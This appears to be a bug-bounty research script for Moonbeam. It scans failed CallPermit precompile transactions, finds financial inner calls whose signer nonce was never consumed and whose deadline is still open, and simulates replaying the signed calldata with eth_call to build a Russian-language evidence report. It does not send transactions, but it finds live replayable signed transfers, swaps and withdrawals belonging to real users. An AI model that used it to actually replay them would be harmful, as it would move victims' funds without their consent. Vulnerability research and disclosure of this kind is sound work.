#!/usr/bin/env node
/**
 * financial_replay_finder.js
 *
 * Phase 1: load all existing bounty_candidates, resolve unknown selectors,
 *          detect nested financial selectors in innerData
 * Phase 2: check current nonce vs nonceBefore → replay window status
 * Phase 3: simulate replay via eth_call
 * Output:  stdout summary + REPORTS/FINANCIAL_REPLAY_EVIDENCE_ru.md
 */

const fs = require("fs");
const path = require("path");

const CALL_PERMIT = "0x000000000000000000000000000000000000080a";
const MOONBEAM_RPCS = [
  process.env.MOONBEAM_RPC,
  "https://moonbeam-rpc.publicnode.com",
  "https://moonbeam.api.onfinality.io/public",
  "https://rpc.api.moonbeam.network",
  "https://moonbeam.unitedbloc.com",
].filter(Boolean);

const FINANCIAL_SELECTORS = {
  "0xa9059cbb": "transfer(address,uint256)",
  "0x23b872dd": "transferFrom(address,address,uint256)",
  "0x095ea7b3": "approve(address,uint256)",
  "0x38ed1739": "swapExactTokensForTokens(uint256,uint256,address[],address,uint256)",
  "0x18cbafe5": "swapExactTokensForETH(uint256,uint256,address[],address,uint256)",
  "0x7ff36ab5": "swapExactETHForTokens(uint256,address[],address,uint256)",
  "0x414bf389": "exactInputSingle((address,address,uint24,address,uint256,uint256,uint256,uint160))",
  "0xc04b8d59": "exactInput((bytes,address,uint256,uint256,uint256))",
  "0xdb3e2198": "exactOutputSingle((address,address,uint24,address,uint256,uint256,uint256,uint160))",
  "0xf28c0498": "exactOutput((bytes,address,uint256,uint256,uint256))",
  "0x4e71d92d": "claim()",
  "0x2e1a7d4d": "withdraw(uint256)",
  "0xdb006a75": "redeem(uint256)",
  "0x42842e0e": "safeTransferFrom(address,address,uint256)",
  "0xf242432a": "safeTransferFrom(address,address,uint256,uint256,bytes)",
  "0xa0712d68": "mint(uint256)",
  "0x6a627842": "mint(address)",
  "0xa6f2ae3a": "buy(uint256)",
  "0xd0e30db0": "deposit()",
  "0x2d2da806": "depositFor(address)",
  "0xe8eda9df": "deposit(address,uint256,address,uint16)",
  "0x69328dec": "withdraw(address,uint256,address)",
};
const FINANCIAL_SET = new Set(Object.keys(FINANCIAL_SELECTORS));

const INPUT_FILES = [
  "bounty_candidates_moonbeam_000000_100000.json",
  "bounty_candidates_moonbeam_25k_50k.jsonl",
  "bounty_candidates_moonbeam_50k_100k.jsonl",
  "bounty_candidates_moonbeam_100k_150k.jsonl",
  "bounty_candidates_moonbeam_150k_200k.jsonl",
  "bounty_candidates_moonbeam_recent25k.jsonl",
  "bounty_candidates_moonbeam_500k_foundation.json",
  "failed_callpermit_moonbeam_50k_validsig.json",
  "failed_callpermit_moonbeam_50k.json",
];

const RESEARCH_DIR = path.join(__dirname);
const REPORTS_DIR = path.join(__dirname, "../REPORTS");

// ── RPC helpers ──────────────────────────────────────────────────────────────

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function rpc(url, method, params, attempt = 0) {
  try {
    const res = await fetch(url, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }),
      signal: AbortSignal.timeout(15000),
    });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const body = await res.json();
    if (body.error) throw new Error(`RPC ${body.error.code}: ${body.error.message}`);
    return body.result;
  } catch (e) {
    if (attempt >= 4) throw e;
    await sleep(800 * (attempt + 1));
    return rpc(url, method, params, attempt + 1);
  }
}

let _rpcUrl = null;
async function getWorkingRpc() {
  if (_rpcUrl) return _rpcUrl;
  for (const url of MOONBEAM_RPCS) {
    try {
      await rpc(url, "eth_blockNumber", []);
      _rpcUrl = url;
      console.error(`[rpc] using ${url}`);
      return url;
    } catch {}
  }
  throw new Error("no working Moonbeam RPC");
}

async function call(to, data) {
  const url = await getWorkingRpc();
  return rpc(url, "eth_call", [{ to, data }, "latest"]);
}

async function callAt(to, data, blockHex) {
  const url = await getWorkingRpc();
  return rpc(url, "eth_call", [{ to, data }, blockHex]);
}

// ── Nonce helpers ─────────────────────────────────────────────────────────────

function nonceCalldata(addr) {
  const clean = addr.toLowerCase().replace("0x", "").padStart(64, "0");
  return "0x7ecebe00" + clean;
}

async function getCurrentNonce(addr) {
  try {
    const res = await call(CALL_PERMIT, nonceCalldata(addr));
    return BigInt(res);
  } catch {
    return null;
  }
}

// ── Selector resolution via openchain.xyz ────────────────────────────────────

const _selCache = {};

async function resolveSelector(sel) {
  if (!sel || sel === "0x") return null;
  if (_selCache[sel] !== undefined) return _selCache[sel];
  if (FINANCIAL_SELECTORS[sel]) {
    _selCache[sel] = FINANCIAL_SELECTORS[sel];
    return _selCache[sel];
  }
  try {
    const res = await fetch(
      `https://api.openchain.xyz/signature-database/v1/lookup?function=${sel}&filter=true`,
      { signal: AbortSignal.timeout(8000) }
    );
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const body = await res.json();
    const hits = body?.result?.function?.[sel];
    const name = hits?.[0]?.name || null;
    _selCache[sel] = name;
    return name;
  } catch {
    _selCache[sel] = null;
    return null;
  }
}

// ── Nested selector scan ───────────────────────────────────────────────────────

function findNestedFinancial(innerData) {
  if (!innerData || innerData.length < 10) return null;
  const hex = innerData.toLowerCase().replace("0x", "");
  // scan every 4-byte aligned position for a known financial selector
  for (let i = 8; i + 8 <= hex.length; i += 2) {
    const candidate = "0x" + hex.slice(i, i + 8);
    if (FINANCIAL_SET.has(candidate)) {
      return { selector: candidate, name: FINANCIAL_SELECTORS[candidate], offset: i / 2 };
    }
  }
  return null;
}

// ── Load candidates ───────────────────────────────────────────────────────────

function readFile(fpath) {
  const buf = fs.readFileSync(fpath);
  // detect UTF-16 LE BOM (0xFF 0xFE)
  if (buf[0] === 0xFF && buf[1] === 0xFE) return buf.toString("utf16le");
  // detect UTF-16 BE BOM (0xFE 0xFF)
  if (buf[0] === 0xFE && buf[1] === 0xFF) {
    const swapped = Buffer.alloc(buf.length);
    for (let i = 0; i < buf.length - 1; i += 2) { swapped[i] = buf[i + 1]; swapped[i + 1] = buf[i]; }
    return swapped.toString("utf8");
  }
  return buf.toString("utf8");
}

function extractJsonArray(raw) {
  const start = raw.indexOf("[");
  if (start === -1) return null;
  return raw.slice(start);
}

function loadCandidates() {
  const all = [];
  const seen = new Set();
  for (const fname of INPUT_FILES) {
    const fpath = path.join(RESEARCH_DIR, fname);
    if (!fs.existsSync(fpath)) { console.error(`[load] missing ${fname}`); continue; }
    let raw;
    try { raw = readFile(fpath).trim(); } catch (e) { console.error(`[load] read error ${fname}: ${e.message}`); continue; }
    if (!raw) { console.error(`[load] empty ${fname}`); continue; }
    let items = [];
    if (fname.endsWith(".jsonl")) {
      items = raw.split("\n").filter(Boolean).map((l) => { try { return JSON.parse(l); } catch { return null; } }).filter(Boolean);
    } else {
      // strip non-JSON header lines (e.g. "valid 1\n{...}\n[...]")
      const jsonPart = extractJsonArray(raw) || raw;
      try {
        const parsed = JSON.parse(jsonPart);
        items = Array.isArray(parsed) ? parsed : [parsed];
      } catch { console.error(`[load] parse error ${fname}`); }
    }
    let added = 0;
    for (const item of items) {
      // use txHash from item, or derive from explorer URL
      if (!item?.txHash && item?.explorer) {
        const m = item.explorer.match(/0x[0-9a-fA-F]{64}/);
        if (m) item.txHash = m[0];
      }
      if (!item?.txHash || seen.has(item.txHash)) continue;
      seen.add(item.txHash);
      all.push(item);
      added++;
    }
    console.error(`[load] ${fname}: ${items.length} raw, ${added} unique added`);
  }
  return all;
}

// ── Replay simulation ─────────────────────────────────────────────────────────

async function simulateReplay(txInputHex) {
  const randomFrom = "0x" + "deadbeef".padEnd(40, "0");
  try {
    const url = await getWorkingRpc();
    const res = await rpc(url, "eth_call", [
      { to: CALL_PERMIT, data: txInputHex, from: randomFrom },
      "latest",
    ]);
    return { success: true, result: res };
  } catch (e) {
    return { success: false, error: e.message.slice(0, 200) };
  }
}

// ── Get tx input from chain ───────────────────────────────────────────────────

async function getTxInput(txHash) {
  const url = await getWorkingRpc();
  try {
    const tx = await rpc(url, "eth_getTransactionByHash", [txHash]);
    return tx?.input || tx?.data || null;
  } catch {
    return null;
  }
}

// ── Main analysis ─────────────────────────────────────────────────────────────

async function analyzeAll() {
  const candidates = loadCandidates();
  console.error(`[analyze] total unique candidates: ${candidates.length}`);

  const now = Math.floor(Date.now() / 1000);
  const findings = [];

  for (let i = 0; i < candidates.length; i++) {
    const c = candidates[i];
    if (!c.innerSelector || !c.signedFrom) continue;

    process.stderr.write(`\r[analyze] ${i + 1}/${candidates.length} ...`);

    // Phase 1: resolve selector
    const resolvedName = await resolveSelector(c.innerSelector);
    const isFinancial = FINANCIAL_SET.has(c.innerSelector);
    const nested = findNestedFinancial(c.innerData || "");

    // Phase 2: check nonce
    const currentNonce = await getCurrentNonce(c.signedFrom);
    const nonceBefore = BigInt(c.nonceBefore ?? c.nonce ?? 0);
    let windowStatus;
    if (currentNonce === null) {
      windowStatus = "UNKNOWN";
    } else if (currentNonce === nonceBefore) {
      const deadlineOk = Number(c.deadline) > now;
      windowStatus = deadlineOk ? "LIVE_OPEN" : "OPEN_EXPIRED";
    } else if (currentNonce > nonceBefore) {
      windowStatus = "CLOSED";
    } else {
      windowStatus = "UNKNOWN";
    }

    const isInteresting = isFinancial || nested || windowStatus === "LIVE_OPEN";
    if (!isInteresting) continue;

    // Phase 3: simulate replay for interesting candidates
    let simulation = null;
    if (windowStatus === "LIVE_OPEN" || windowStatus === "OPEN_EXPIRED") {
      const txInput = c.txInput || (await getTxInput(c.txHash));
      if (txInput) {
        simulation = await simulateReplay(txInput);
      }
    }

    findings.push({
      txHash: c.txHash,
      block: c.block,
      blockTimestamp: c.blockTimestamp,
      dispatcher: c.dispatcher,
      signedFrom: c.signedFrom,
      targetTo: c.targetTo,
      innerSelector: c.innerSelector,
      innerName: resolvedName || c.innerName || "unknown",
      isFinancial,
      nested,
      nonceBefore: nonceBefore.toString(),
      currentNonce: currentNonce?.toString() ?? "N/A",
      deadline: c.deadline,
      deadlineHuman: new Date(Number(c.deadline) * 1000).toISOString(),
      windowStatus,
      simulation,
      network: c.network || "moonbeam",
      explorer: c.explorer || `https://moonbeam.moonscan.io/tx/${c.txHash}`,
    });
  }

  process.stderr.write("\n");
  return findings;
}

// ── Report generation ─────────────────────────────────────────────────────────

function statusEmoji(s) {
  return { LIVE_OPEN: "🔴 LIVE", OPEN_EXPIRED: "🟡 WAS OPEN (deadline прошёл)", CLOSED: "✅ CLOSED", UNKNOWN: "❓ UNKNOWN" }[s] || s;
}

function buildReport(findings) {
  const now = new Date().toISOString();
  const liveFinancial = findings.filter((f) => f.windowStatus === "LIVE_OPEN" && (f.isFinancial || f.nested));
  const liveAny = findings.filter((f) => f.windowStatus === "LIVE_OPEN");
  const expiredFinancial = findings.filter((f) => f.windowStatus === "OPEN_EXPIRED" && (f.isFinancial || f.nested));
  const simSuccess = findings.filter((f) => f.simulation?.success);

  let md = `# Финансовые replay-кандидаты CallPermit — Moonbeam

**Дата анализа:** ${now}
**Уязвимость:** CallPermit precompile (0x000000000000000000000000000000000000080a) — nonce rollback при revert subcall
**Механика:** failed dispatch() → публичные v/r/s в calldata → nonce не потреблён → любой может переиграть тот же calldata позже

---

## Сводка

| Метрика | Значение |
|---------|---------|
| Проверено кандидатов | ${findings.length} |
| LIVE OPEN (deadline активен) | ${liveAny.length} |
| LIVE OPEN + финансовые | ${liveFinancial.length} |
| WAS OPEN + финансовые | ${expiredFinancial.length} |
| Симуляция replay SUCCESS | ${simSuccess.length} |

`;

  if (simSuccess.length > 0) {
    md += `## ⚠️ BOUNTY-GRADE: Симуляция replay успешна\n\n`;
    for (const f of simSuccess) md += formatFinding(f);
  }

  if (liveFinancial.length > 0) {
    md += `## 🔴 КРИТИЧЕСКИЕ: Live window + финансовый inner call\n\n`;
    for (const f of liveFinancial) md += formatFinding(f);
  } else if (liveAny.length > 0) {
    md += `## 🔴 LIVE окна (любые inner calls)\n\n`;
    for (const f of liveAny) md += formatFinding(f);
  }

  if (expiredFinancial.length > 0) {
    md += `## 🟡 Финансовые inner calls — deadline истёк, но window WAS OPEN\n\n`;
    for (const f of expiredFinancial) md += formatFinding(f);
  }

  const restFinancial = findings.filter(
    (f) => (f.isFinancial || f.nested) && f.windowStatus === "CLOSED"
  );
  if (restFinancial.length > 0) {
    md += `## Финансовые inner calls — window CLOSED (нonce потреблён)\n\n`;
    for (const f of restFinancial) md += formatFinding(f);
  }

  md += `---\n\n## Все найденные кандидаты\n\n`;
  md += `| # | TX | Target | Inner call | Тип | Nonce window |\n`;
  md += `|---|----|---------|-----------|----|-------------|\n`;
  for (let i = 0; i < findings.length; i++) {
    const f = findings[i];
    const label = f.isFinancial ? "💰 FINANCIAL" : f.nested ? "🔗 NESTED_FIN" : "❓ OTHER";
    const hash8 = f.txHash.slice(0, 10) + "...";
    md += `| ${i + 1} | [${hash8}](${f.explorer}) | \`${f.targetTo?.slice(0, 10)}...\` | ${f.innerName} | ${label} | ${statusEmoji(f.windowStatus)} |\n`;
  }

  md += `\n---\n\n## Методология\n\n`;
  md += `1. Загружены все существующие bounty_candidates JSON/JSONL файлы\n`;
  md += `2. Для каждого кандидата: резолв селектора через openchain.xyz API\n`;
  md += `3. Поиск вложенных финансовых селекторов в innerData (побайтовое сканирование)\n`;
  md += `4. Проверка текущего nonce через eth_call к CallPermit precompile\n`;
  md += `5. Симуляция replay через eth_call с оригинальным calldata\n`;

  return md;
}

function formatFinding(f) {
  const nested = f.nested ? `\n**Вложенный финансовый вызов:** \`${f.nested.selector}\` = \`${f.nested.name}\` (offset ${f.nested.offset} bytes)` : "";
  const simLine = f.simulation
    ? f.simulation.success
      ? `\n**Симуляция replay:** ✅ SUCCESS → \`${(f.simulation.result || "").slice(0, 80)}\``
      : `\n**Симуляция replay:** ❌ revert → \`${f.simulation.error}\``
    : "";

  return `### Finding: \`${f.txHash}\`

**Network:** ${f.network}
**Failed tx:** [${f.txHash}](${f.explorer})
**Block:** ${f.block} (${f.blockTimestamp ? new Date(Number(f.blockTimestamp) * 1000).toISOString() : "N/A"})
**Signer (from):** \`${f.signedFrom}\`
**Target:** \`${f.targetTo}\`
**Inner call selector:** \`${f.innerSelector}\` = \`${f.innerName}\`
**Financial action:** ${f.isFinancial ? "✅ Прямой финансовый вызов" : f.nested ? "🔗 Вложен финансовый вызов" : "❓ Неизвестно"}${nested}
**Signed nonce:** ${f.nonceBefore}
**Current nonce:** ${f.currentNonce}
**Deadline:** ${f.deadline} (${f.deadlineHuman})
**Replay window:** ${statusEmoji(f.windowStatus)}${simLine}
**Impact:** ${impactDescription(f)}

---

`;
}

function impactDescription(f) {
  if (f.isFinancial && f.windowStatus === "LIVE_OPEN")
    return "Любой observer может немедленно переиграть транзакцию — финансовое действие от имени signer без его ведома.";
  if (f.isFinancial && f.windowStatus === "OPEN_EXPIRED")
    return "Окно replay существовало между failed tx и истечением deadline — злоумышленник мог исполнить финансовое действие.";
  if (f.nested && f.windowStatus === "LIVE_OPEN")
    return "Inner call содержит вложенный финансовый вызов — replay активен.";
  if (f.windowStatus === "CLOSED")
    return "Nonce потреблён — либо replay уже был выполнен, либо signer самостоятельно продвинул nonce.";
  return "Требует дополнительного анализа.";
}

// ── Entry point ───────────────────────────────────────────────────────────────

async function main() {
  const findings = await analyzeAll();

  if (findings.length === 0) {
    console.log("No interesting findings in existing candidates.");
    console.log("Consider running scan_bounty_callpermit_candidates.js moonbeam 100000 200 for blocks 200k-300k");
    return;
  }

  console.log(`\n=== RESULTS: ${findings.length} interesting findings ===`);
  for (const f of findings) {
    const tag = f.windowStatus === "LIVE_OPEN" ? "LIVE" : f.windowStatus;
    const fin = f.isFinancial ? "FINANCIAL" : f.nested ? "NESTED" : "other";
    const sim = f.simulation?.success ? " [REPLAY_SUCCESS]" : "";
    console.log(`  [${tag}][${fin}]${sim} ${f.txHash} nonce=${f.nonceBefore} sel=${f.innerSelector}(${f.innerName})`);
  }

  const report = buildReport(findings);
  if (!fs.existsSync(REPORTS_DIR)) fs.mkdirSync(REPORTS_DIR, { recursive: true });
  const outPath = path.join(REPORTS_DIR, "FINANCIAL_REPLAY_EVIDENCE_ru.md");
  fs.writeFileSync(outPath, report, "utf8");
  console.log(`\nReport: ${outPath}`);
}

main().catch((e) => { console.error("FATAL:", e); process.exit(1); });
